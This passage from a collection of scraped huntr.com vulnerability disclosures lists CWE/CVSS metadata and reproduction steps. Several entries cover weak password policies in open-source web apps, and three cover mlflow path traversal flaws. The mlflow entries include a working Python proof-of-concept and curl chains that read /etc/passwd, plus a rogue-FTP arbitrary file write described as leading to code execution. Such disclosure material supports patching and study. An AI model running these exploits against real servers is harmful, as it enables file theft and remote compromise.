able to detect another password security issue.\nWhile changing the password the attacker can use the proxy and submit for example password as 1.\nAltough there is a passwort policy restriction but i managed to bypass that.\nLet me show you :)\nThe Password is now 2 lets change it to HACK\nAs you can see we have a password policy at least 8 characters with one digit.\nLets change the password to 1 by deleting the first newpassword and leaving the confirmation.\nAfter that we will login with the passwort 1 to the app.\nlets see :)\nchanged the passwort from 2 to 1 lets see the reply and output\nprofile and passwort accepted.\nlets login with the username: user@demo.local adn PASS: 1\nAs you can see the password is 1 lets login.\nas you can see we have logged in successfully.\nWill show it you again.\nBypass for the strong password policy.\nThank you for watching :)\nImpact\nHello,\ni was able to detect another password security issue.\nWhile changing the password the attacker can use the proxy and submit for example password as 1.\nAltough there is a passwort policy restriction but i managed to bypass that.\nLet me show you :)\nThe Password is now 2 lets change it to HACK\nAs you can see we have a password policy at least 8 characters with one digit.\nLets change the password to 1 by deleting the first newpassword and leaving the confirmation.\nAfter that we will login with the passwort 1 to the app.\nlets see :)\nchanged the passwort from 2 to 1 lets see the reply and output\nprofile and passwort accepted.\nlets login with the username: user@demo.local adn PASS: 1\nAs you can see the password is 1 lets login.\nas you can see we have logged in successfully.\nWill show it you again.\nBypass for the strong password policy.\nThank you for watching :)"}, "https://huntr.com/bounties/32a873c8-f605-4aae-9272-d80985ef2b73/": {"cve": "", "cve_link": "", "cwe": "CWE-521: Weak Password Requirements", "cwe_link": "https://cwe.mitre.org/data/definitions/521.html", "severity_score": "Medium (6.2)\nAttack vector\nPhysical\nAttack complexity\nHigh\nPrivileges required\nLow\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/kiwitcms/kiwi", "fix_commit": "https://www.github.com/kiwitcms/kiwi/commit/802ee508f83a9ffb86b00f39837b7312145d4a06", "description": "Description: We can change the password with just 1 character when we use change password function.\nProof of Concept When you change password, just press any character and then submit. You will see \"Your password has been changed\".\nImpact\nWhen users change password to a simple password (with any character or symbol), attacker can easily guess user password and access account."}, "https://huntr.com/bounties/a9021e93-6d18-4ac1-98ce-550c4697a4ed/": {"cve": "CVE-2022-3376", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3376", "cwe": "CWE-521: Weak Password Requirements", "cwe_link": "https://cwe.mitre.org/data/definitions/521.html", "severity_score": "Low (3.5)\nAttack vector\nPhysical\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nNone\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/2ffc2af65c8f8113b06e0b89929c604bcdf844b9", "description": "Description\nRdiffweb has a weak password implementation , where a new password set by the user can be same to the old password\nProof of Concept\nGo to https://rdiffweb-demo.ikus-soft.com/prefs/general end point\nChange your password\nSet your new password similar to old password you will notice that the same password is accepted by the application\nImpact\nPassword changes in the Rdiffweb application would usually happen for one of three reasons:\nThe user has forgotten their password and needs to reset it to a known value. In this case, reuse of the same password is unlikely. 2)The user is aware (or suspects) that their password is known to someone else and wants to reset it to a new value that is known only to them. In this case, the user would be motivated to choose a new password, although it's possible that they could reuse the same password in error. 3)An administrator is aware (or suspects) that the user's password is known to someone else and wants to reset it to a new value that is known only to the user. In this case, the user might be less motivated to choose a new password and password reuse is more likely. However, given the risks of phishing and the importance of ensuring a password reset, it's also likely the administrator would communicate\nAt the same time, considering the likely human behaviour in each case (and that an attacker would need to combine it with another vulnerability or phishing in order to gain or retain access to a legitimate user's account), the likelihood of successful exploitation of this vulnerability is relatively low."}, "https://huntr.com/bounties/1f6a5e49-23f2-45f7-8661-19f9cee8ae97/": {"cve": "CVE-2022-3326", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3326", "cwe": "CWE-521: Weak Password Requirements", "cwe_link": "https://cwe.mitre.org/data/definitions/521.html", "severity_score": "Medium (5.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nRequired\nScope\nUnchanged\nConfidentiality\nLow\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/ee98e5af78ec60db8a17fef6ea0ca250e3f31eec", "description": "Description\nAs you many observe that rdiffweb strictly has a password policy where it prompts out that the password should be between 8 and 128 characters . But the application does not filter blank spaces used in a password\nProof of Concept\n1) Go to https://rdiffweb-demo.ikus-soft.com/prefs/general\n2) Change the password . Old password - admin123 and set the new password as 10 blank spaces(tapping the space bar 10 times)\n3) You can see that the application accepts blank spaces in a password and do not scrape them out \n\n\n\n\n\n\n# Impact\n\nThis way user will be able to set a blank password bypassing the application logic for password complexities"}, "https://huntr.com/bounties/00e464ce-53b9-485d-ac62-6467881654c2/": {"cve": "CVE-2022-3268", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3268", "cwe": "CWE-521: Weak Password Requirements", "cwe_link": "https://cwe.mitre.org/data/definitions/521.html", "severity_score": "Critical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/minarca", "fix_commit": "https://www.github.com/ikus060/minarca/commit/7b5c7e6cbd59268d5cd4f1b5f42e721db116f71a", "description": "Description\nFor testing the issue, I have used the demo website. In edit user profile section we can set New Password to 1 (Or any character). There is no policy for password or no password checking. Moreover, it also allows us to change password and the new password also can be set with weak password.\nProof of Concept\nAccess to the demo website and login as an admin. Edit user with New password 1 or any character (short, weak) Try to login with the new user and it succeed.\nWith normal user, login and try to change password function, it also succeed.\nImpact\nAttacker will able to get all user's accounts with weak password using bruiteforce attack."}, "https://huntr.com/bounties/58eae29e-3619-449d-9bba-fdcbabcba5fe/": {"cve": "CVE-2022-3179", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2022-3179", "cwe": "CWE-521: Weak Password Requirements", "cwe_link": "https://cwe.mitre.org/data/definitions/521.html", "severity_score": "High (7.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/ikus060/rdiffweb", "fix_commit": "https://www.github.com/ikus060/rdiffweb/commit/233befc33bdc45d4838c773d5aed4408720504c5", "description": "Description\nIn this scenario, I use the demo website. It allows us to add more user to test. With password, we can set it 1 (Or any charater). There is no policy for password or no password checking. Moreover, it also allows us to change password and the new password also can be set with password.\nProof of Concept\nAccess to the demo website and login as an admin. Add user with password 1 or any charater (short, weak) Try to login with the new user and it succeed.\nWith normal user, login and try to change password function, it also succeed.\nImpact\nBe able to get all user's accounts with weak password by bruteforce attack."}, "https://huntr.com/bounties/737383c0-add7-4db2-984d-201765cd8fd3/": {"cve": "", "cve_link": "", "cwe": "CWE-521: Weak Password Requirements", "cwe_link": "https://cwe.mitre.org/data/definitions/521.html", "severity_score": "Critical (9.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/hay-kot/mealie", "fix_commit": "https://www.github.com/hay-kot/mealie/commit/54c4f19a5c76809ae2c6a87a3466006a262698f0", "description": "Description\nThe password policy used in the account creation and password change pages is weak, allowing to set a password of only 1 character.\nProof of Concept\nCase 1 - Account Creation\n1 - Login as admin and go to the users page.\n2 - Create a new user and set 1 as the password and click in \"Create\".\n3 - The new user is created successfully.\n\nCase 2 - Password Change\n1 - Login as a normal user an go to the profile page.\n2 - Click in change password and set 1 as the new password and click in \"Save\".\n3 - The password is changed successfully.\nImpact\nAn attacker could easily guess user passwords and gain access to user and administrative accounts."}, "https://huntr.com/bounties/4bd941f6-570a-43f0-8921-6e66273c8aee/": {"cve": "", "cve_link": "", "cwe": "CWE-521: Weak Password Requirements", "cwe_link": "https://cwe.mitre.org/data/definitions/521.html", "severity_score": "Critical (9.4)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/086ec10849b87a851c812497eff01595ac20dc20", "description": "Description\nStep to reproduce:\n1. Go to https://book.dansmonorage.blue/password-reset.\n2. Type your email and recieve reset password link.\n3. Enter a as new password and success.\nProof of Concept\nPOST /password-reset/D4VUXDL5 HTTP/2\nHost: book.dansmonorage.blue\nCookie: csrftoken=ivRWhtdEybPyWPLQQeSerUxyZxoHTLM3n7WEY8ANL6vVlWnx4h5vM5WlNrRlO4Bx; django_language=None\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3\nAccept-Encoding: gzip, deflate\nReferer: https://book.dansmonorage.blue/password-reset/D4VUXDL5\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 114\nOrigin: https://book.dansmonorage.blue\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\nTe: trailers\n\ncsrfmiddlewaretoken=OraU4Y5nDHGV7JxR8IyUV91JyUlL6hWgT3fCLDswQCmiwQ9ymLLbgkqwmOOp1ALK&password=a&confirm-password=a\nImpact\nWith the server accept weak password lead to allow attacker perform brute-force attack to gain access to the victim's account."}, "https://huntr.com/bounties/a7e73962-e9a3-4616-8351-e436a24bad88/": {"cve": "", "cve_link": "", "cwe": "CWE-521: Weak Password Requirements", "cwe_link": "https://cwe.mitre.org/data/definitions/521.html", "severity_score": "Critical (9.1)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/bookwyrm-social/bookwyrm", "fix_commit": "https://www.github.com/bookwyrm-social/bookwyrm/commit/137311e006db1fada52cc53bee1943fc9b2f271a", "description": "Description\nBookWyrm uses weak password policy when allows user to change password with just 1 character through the change password function.\nSteps to reproduce\n1.Login then go to the Change password page (https://book.dansmonorage.blue/preferences/password)\n2.Enter a character (for example: 1) in the new password field and the same in the confirm password field\n3.You will see that the password has been changed successfully.\nImpact\nWhen users change password to a too simple password, attacker can easily guess user password and access account.\nSuggestion\nBookWyrm should apply more strict policy in changing password such as the password length must be more than or equal to 8, at least 1 special character, at least 1 number, at least one capital character,..."}, "https://huntr.com/bounties/fe53bf71-3687-4711-90df-c26172880aaf/": {"cve": "CVE-2023-6977", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6977", "cwe": "CWE-29: Path Traversal: '\\..\\filename'", "cwe_link": "https://cwe.mitre.org/data/definitions/29.html", "severity_score": "Critical (10)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nChanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nLow\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/4bd7f27c810ba7487d53ed5ef1038fca0f8dc28c", "description": "Write-up\nDescription\nThis is a newer bypass to this submission.\nNote: this PoC was tested on a Linux machine only.\nProof of Concept\nEnvironment setup\nPrerequisites: Python3 installed on the machine.\nInstall latest version of mlflow:\npip3 install mlflow\nInstall pyenv: installation guide.\nStart the server/ui:\nmlflow ui --host 127.0.0.1:5001\nExploitation\nWe define these 3 functions in our exploit script to make it easier to interact with the API:\nimport requests\n\ns = requests.Session()\n\nbase_url = \"http://127.0.0.1:5001\"\n\n# Create model\ndef create(name):\n    data = {\n        \"name\": name,\n    }\n    return s.post(\n        f\"{base_url}/ajax-api/2.0/mlflow/registered-models/create\",\n        json=data,\n    )\n\n# Create model version\ndef create_version(name, source):\n    data = {\n        \"name\": name,\n        \"source\": source,\n    }\n    return s.post(\n        f\"{base_url}/ajax-api/2.0/mlflow/model-versions/create\",\n        json=data,\n    )\n\n# Get model version artifact\ndef get(name, path, version=1):\n    params = {\n        \"name\": name,\n        \"path\": path,\n        \"version\": version,\n    }\n    return s.get(\n        f\"{base_url}/model-versions/get-artifact\",\n        params=params,\n    )\nCreate a model named \"PoC\":\nname = \"PoC\"\nresp = create(name)\nprint(resp.json())\nOutput:\n{\"registered_model\": {\"name\": \"PoC\", \"creation_timestamp\": 1698934121711, \"last_updated_timestamp\": 1698934121711}}\nCreate a model version with source set to \"//proc/self/root\" (which is a symlink to \"/\"):\nresp = create_version(name, source='//proc/self/root')\nprint(resp.json())\nOutput:\n{\"model_version\": {\"name\": \"PoC\", \"version\": \"1\", \"creation_timestamp\": 1698934437928, \"last_updated_timestamp\": 1698934437928, \"current_stage\": \"None\", \"description\": \"\", \"source\": \"//proc/self/root\", \"run_id\": \"\", \"status\": \"READY\", \"run_link\": \"\"}}\nGet an artifact with path set to \"etc/passwd\" (or any other file on the system, just make sure not to add a slash at the start):\nresp = get(name, path=\"etc/passwd\", version=1)\nprint(resp.text)\nOutput (truncated):\nroot:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n...\nFull PoC script (xpl.py):\nimport requests\n\ns = requests.Session()\n\nbase_url = \"http://127.0.0.1:5001\"\n\n# Create model\ndef create(name):\n    data = {\n        \"name\": name,\n    }\n    return s.post(\n        f\"{base_url}/ajax-api/2.0/mlflow/registered-models/create\",\n        json=data,\n    )\n\n# Create model version\ndef create_version(name, source):\n    data = {\n        \"name\": name,\n        \"source\": source,\n    }\n    return s.post(\n        f\"{base_url}/ajax-api/2.0/mlflow/model-versions/create\",\n        json=data,\n    )\n\n# Get model version artifact\ndef get(name, path, version=1):\n    params = {\n        \"name\": name,\n        \"path\": path,\n        \"version\": version,\n    }\n    return s.get(\n        f\"{base_url}/model-versions/get-artifact\",\n        params=params,\n    )\n\nif __name__ == \"__main__\":\n    # Create model\n    name = \"PoC\"\n    resp = create(name)\n    # print(resp.json())\n\n    # Create model version\n    resp = create_version(name, source='//proc/self/root')\n    # print(resp.json())\n\n    # Get artifact\n    file_to_read = \"/etc/passwd\" # can be changed to any filepath\n    path = file_to_read.lstrip(\"/\") # remove leading slash\n    resp = get(name, path=path, version=1)\n    print(resp.text)\nRun the PoC script like this:\npython3 xpl.py\nOutput (truncated):\nroot:x:0:0:root:/root:/usr/bin/zsh\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n...\nVulnerable code\nThe vulnerability resides in is_local_uri function inside mlflow/utils/uri.py:\ndef is_local_uri(uri, is_tracking_or_registry_uri=True):\n    \"\"\"\n    Returns true if the specified URI is a local file path (/foo or file:/foo).\n\n    :param uri: The URI.\n    :param is_tracking_uri: Whether or not the specified URI is an MLflow Tracking or MLflow\n                            Model Registry URI. Examples of other URIs are MLflow artifact URIs,\n                            filesystem paths, etc.\n    \"\"\"\n    if uri == \"databricks\" and is_tracking_or_registry_uri:\n        return False\n\n    if is_windows() and uri.startswith(\"\\\\\\\\\"):\n        # windows network drive path looks like: \"\\\\<server name>\\path\\...\"\n        return False\n\n    parsed_uri = urllib.parse.urlparse(uri)\n    if parsed_uri.hostname and not (\n        parsed_uri.hostname == \".\"\n        or parsed_uri.hostname.startswith(\"localhost\")\n        or parsed_uri.hostname.startswith(\"127.0.0.1\")\n    ):\n        return False\n\n    scheme = parsed_uri.scheme\n    if scheme == \"\" or scheme == \"file\":\n        return True\n\n    if is_windows() and len(scheme) == 1 and scheme.lower() == pathlib.Path(uri).drive.lower()[0]:\n        return True\n\n    return False\nThe interesting piece of code resides here:\nparsed_uri = urllib.parse.urlparse(uri)\nif parsed_uri.hostname and not (\n    parsed_uri.hostname == \".\"\n    or parsed_uri.hostname.startswith(\"localhost\")\n    or parsed_uri.hostname.startswith(\"127.0.0.1\")\n):\n    return False\nKnowing that uri is set to \"//proc/self/root\", the hostname that urlparse parses is \"proc\", therefore the check above is verified and is_local_uri returns False. Though it is clear that //proc/self/root is a local URI (Linux sees the 2 slashes as one slash).\nImpact\nThis vulnerability enables malicious users to read sensitive files on the server."}, "https://huntr.com/bounties/029a3824-cee3-4cf1-b260-7138aa539b85/": {"cve": "CVE-2023-6975", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6975", "cwe": "CWE-29: Path Traversal: '\\..\\filename'", "cwe_link": "https://cwe.mitre.org/data/definitions/29.html", "severity_score": "Critical (9.8)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nHigh\nAvailability\nHigh\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/b9ab9ed77e1deda9697fe472fb1079fd428149ee", "description": "As the framework is quite complex, I'm going to take the default configuration as reference for the whole report\n\ud83d\udd12\ufe0f Requirements\nNone: by default no authentication is required.\n  \ud83d\udcdd Description\nAfter reporting the model:/ -> http:// issue in my previous report, I started to search on the other model's source protocols:\n[\"\", \"file\", \"s3\", \"gs\", \"wasbs\", \"ftp\", \"sftp\", \"dbfs\", \"hdfs\", \"viewfs\", \"runs\", \"models\", \"http\", \"https\", \"mlflow-artifacts\"]\nThis issue highlighted in this report impacts the FTP's download process. To interact with it, you need to:\n1. Create a model:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'\n2. Create a model version:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"source\": \"ftp://{{FTP-HOST}}:{{FTP-PORT}}/a\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\n3. Access an artifact content:\ncurl 'http://127.0.0.1:5000/model-versions/get-artifact?path={{NAME}}&name=poc&version=1'\nCare, model version might change depending on your mlflow context.\n  When accessing /model-versions/get-artifact on an FTP model, it triggers the following execution flow:\n1. After the path getting sanitized (safely), it calls _send_artifact function to get the requested artifact content: (permalink)\nfile_path = os.path.abspath(artifact_repository.download_artifacts(path))\n# ...\nreturn _response_with_file_attachment_headers(file_path, file_sender_response)\n2. In case the requested file is a directory, it walks over all the FTP's file and create the associated arborescence on the file system (It checks it using CWD FTP command): (permalink)\n# ...\nfutures = {}\nif self._is_directory(artifact_path):\n    for file_info in self._iter_artifacts_recursive(artifact_path):\n        if file_info.is_dir:  # Empty directory\n            os.makedirs(os.path.join(dst_path, file_info.path), exist_ok=True)\n        else:\n            fut = _download_file(file_info.path, dst_path)\n            futures[fut] = file_info.path\nelse:\n    fut = _download_file(artifact_path, dst_path)\n    futures[fut] = artifact_path\n# ...\n3. To walk over the FTP arborescence, it uses the list_artifacts FTP's model method: (permalink)\ndef list_artifacts(self, path=None):\n    with self.get_ftp_client() as ftp:\n        # ...\n        artifact_files = ftp.nlst(list_dir)\n        artifact_files = list(filter(lambda x: x != \".\" and x != \"..\", artifact_files))\n        # ...\n        artifact_files = [os.path.basename(f) for f in artifact_files]\n        infos = []\n        for file_name in artifact_files:\n            # ...\n    return infos\n4. Then it download using the _download_file FTP's model method: (permalink)\ndef _download_file(self, remote_file_path, local_path):\n    remote_full_path = (\n        posixpath.join(self.path, remote_file_path) if remote_file_path else self.path\n    )\n    with self.get_ftp_client() as ftp:\n        with open(local_path, \"wb\") as f:\n            ftp.retrbinary(\"RETR \" + remote_full_path, f.write)\nIn the last snippet, remote_file_path will be the concatenation of FTP arborescence with a temporary folder. For example: /tmp/<RANDOM>/<FTP-DIR>/<FTP-DIR>/<FTP-FILE>\n  The problem in the above flow is that, in case the FTP Server returns /.. as a directory name, it will:\nBypass the x == \"..\" check.\nNormalised to .. thanks to posixpath.basename.\nConcatenated as /../ in the file path.\nRESULT:\n/tmp/<RANDOM>/../<FTP-FILE>\nWhich is basically a full controlled file write via path traversal.\n  \ud83d\udca5 Proof of Concept\nThe rogue FTP server used's in the following PoC can be found here: source.\nExploitation process\nFull controlled File Write\nStart the mlflow web server:\nmlflow ui --host 127.0.0.1:5000\nStart the rogue FTP server:\npython rogue_ftp.py --port 4444 --path /tmp/poc.txt --content \"Hello :)\"\nCreate a registered model:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'\nCreate an FTP model version:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"source\": \"ftp://mizu:mizu@127.0.0.1:4444/a\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\nTrigger the download:\ncurl 'http://127.0.0.1:5000/model-versions/get-artifact?path=random&name=poc&version=2'\nWarning: your version value might change depending on your current server setup!\nAs you can see, /tmp/poc.txt is created!\nRemote Code Execution\nLike I've shown in my previous report, using a full controlled file write, it is easy to get an RCE by overwriting .bashrc for example. For more information feel free to read it again.\n  Models Impact\nIn addition of the previously provided PoCs, I would like to justify even more the data & models impact of this issue. As described in my previous report, even if the attacker didn't manage to get an RCE, he could abuse the file write to overwrite any artifact yaml.\nThis would make him able to control whatever the mlflow server will consume in the future and even leverage it to local file disclosure. To do so, change the artifact value to a folder of his choice and access files from /model-versions/get-artifact?path={{FILENAME}}&name=poc&version=XX.\n  \ud83d\udee0\ufe0f Fix suggestion\nNormalise filenames before check if they are equal to ..:\nartifact_files = [os.path.basename(f) for f in artifact_files]\n# ...\nartifact_files = list(filter(lambda x: x != \".\" and x != \"..\", artifact_files))\nImpact\nA malicious user could use this issue to get command execution on the vulnerable machine and get access to data & models information."}, "https://huntr.com/bounties/11209efb-0f84-482f-add0-587ea6b7e850/": {"cve": "CVE-2023-6909", "cve_link": "https://nvd.nist.gov/vuln/detail/CVE-2023-6909", "cwe": "CWE-29: Path Traversal: '\\..\\filename'", "cwe_link": "https://cwe.mitre.org/data/definitions/29.html", "severity_score": "High (7.5)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nNone\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nHigh\nIntegrity\nNone\nAvailability\nNone\nOpen in visual CVSS calculator", "repo_link": "https://github.com/mlflow/mlflow", "fix_commit": "https://www.github.com/mlflow/mlflow/commit/1da75dfcecd4d169e34809ade55748384e8af6c1", "description": "As the framework is quite complex, I'm going to take the default configuration as reference for the whole report\n\ud83d\udd12\ufe0f Requirements\nNone: by default no authentication is required.\n  \ud83d\udcdd Description\nThe MLFlow web application allows to create experiments and associate runs to it. This can be done with:\n1. Create an experiment:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"artifact_location\": \"https://mizu.re/?a=a\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create'\n\n# Output\n{\n  \"experiment_id\": \"896866883557087791\"\n}\n2. Associate a run to it:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"experiment_id\": \"896866883557087791\"}' 'http://127.0.0.1:5000/api/2.0/mlflow/runs/create'\n\n# Output\n{\n  \"run\": {\n    \"info\": {\n      \"run_uuid\": \"20f2140b43734ab784677945a7ec9db5\",\n      # ...\n      \"artifact_uri\": \"https://mizu.re/20f2140b43734ab784677945a7ec9db5/artifacts?a=a\",\n      # ...\n    },\n    \"inputs\": {}\n  }\n}\nIn this flow, there are 2 interesting things:\n- Any value is allowed in the experiment's artifact_location attribute.\n- In case of an http(s) URL with query string (?a=a), when associate a run, it will append it at the end.\n  The second behavior is due to the append_to_uri_path function: (permalink)\ndef append_to_uri_path(uri, *paths):\n    path = \"\"\n    # ...\n\n    new_uri_path = _join_posixpaths_and_append_absolute_suffixes(parsed_uri.path, path)\n    new_parsed_uri = parsed_uri._replace(path=new_uri_path)\n\n    return prefix + urllib.parse.urlunparse(new_parsed_uri)\nAs you can see in the above snippet, it parse / unparse the URL to add the path to URL.path without changing the rest of the URL. Due to this, https://mizu.re/?a=a is transformed to https://mizu.re/20f2140b43734ab784677945a7ec9db5/artifacts?a=a.\n  Why is this a problem?\n  When creating a model version, it is possible to link it to a run:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"run_id\": \"20f2140b43734ab784677945a7ec9db5\", \"source\": \"XXXXXXX\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\nIn order to validate the provided source, it will check, in case of a local path, if it is one of the run's artifact parent directories: (permalink)\ndef _validate_source(source: str, run_id: str) -> None:\n    if is_local_uri(source):\n        if run_id:\n            store = _get_tracking_store()\n            run = store.get_run(run_id)\n            source = pathlib.Path(local_file_uri_to_path(source)).resolve() # HERE\n            run_artifact_dir = pathlib.Path(local_file_uri_to_path(run.info.artifact_uri)).resolve()\n            if run_artifact_dir in [source, *source.parents]:\n                return\n    # ...\nTo do that, it will convert the run's artefact URI to a file:/// URI without considering the initial protocol. This is done using the local_file_uri_to_path function: (permalink)\ndef local_file_uri_to_path(uri):\n    path = uri\n    if uri.startswith(\"file:\"):\n        parsed_path = urllib.parse.urlparse(uri)\n        path = parsed_path.path\n        # Fix for retaining server name in UNC path.\n        if is_windows() and parsed_path.netloc:\n            return urllib.request.url2pathname(rf\"\\\\{parsed_path.netloc}{path}\")\n    return urllib.request.url2pathname(path)\nAs a summary, it will:\n1. Take the run's URI.\n2. Convert it to a local URI (https://mizu.re/20f2140b43734ab784677945a7ec9db5/artifacts?a=a -> /<current-working-directory>/https:/mizu.re/20f2140b43734ab784677945a7ec9db5/artifacts?a=a).\n3. Resolve the local URI (../).\n4. Create a list of parent directory (/, /<CWD>, /<CWD>/https:, /<CWD>/https:/mizu.re...)\n5. Check if the provided source is one of the parent directories.\n  Thus, because it is possible to control the end of a run's artifact URI thanks to the query string, we could create an experiment with -> http:///?/../../../../../../../../../../../../../../etc/.\nIn this configuration, the run artifact URI will become http:///<random-hex>/artifact?/../../../../../../../../../../../../../../etc/. When creating a linked model version, it will be converted to /etc/ which will allows to use /etc/ as model's source.\nThen, querying http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1 should return you /etc/passwd.\n  \ud83d\udca5 Proof of Concept\nStart the mlflow web server:\nmlflow ui --host 127.0.0.1:5000\nCreate a malicious experiment:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"artifact_location\": \"http:///?/../../../../../../../../../../../../../../etc/\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/experiments/create'\nAssociate a run to it:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"experiment_id\": \"{{EXPERIMENT_ID}}\"}' 'http://127.0.0.1:5000/api/2.0/mlflow/runs/create'\nCreate a registered model:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/registered-models/create'\nLink a model version to the malicious run:\ncurl -X POST -H 'Content-Type: application/json' -d '{\"name\": \"poc\", \"run_id\": \"{{RUN_ID}}\", \"source\": \"file:///etc/\"}' 'http://127.0.0.1:5000/ajax-api/2.0/mlflow/model-versions/create'\nRead /etc/passwd:\ncurl 'http://127.0.0.1:5000/model-versions/get-artifact?path=passwd&name=poc&version=1'\n  \ud83d\uddbc\ufe0f Models Impact\nThis issue can be used to read any files on the system. Depending on the server configuration, this could impact them at many levels.\n  \ud83d\udee0\ufe0f Fix suggestion\nThere is 2 ways to fix this issue:\nAvoid keeping ?a=a at the end of artifact_uri for runs.\nCheck the run's artifact URI protocol before converting it to local URI.\nImpact\nA malicious user could abuse this vulnerability to read any file on the victim server like:\n- SSH Keys\n- Artifacts information\n- Internal configuration\n- Sensitive files\n- 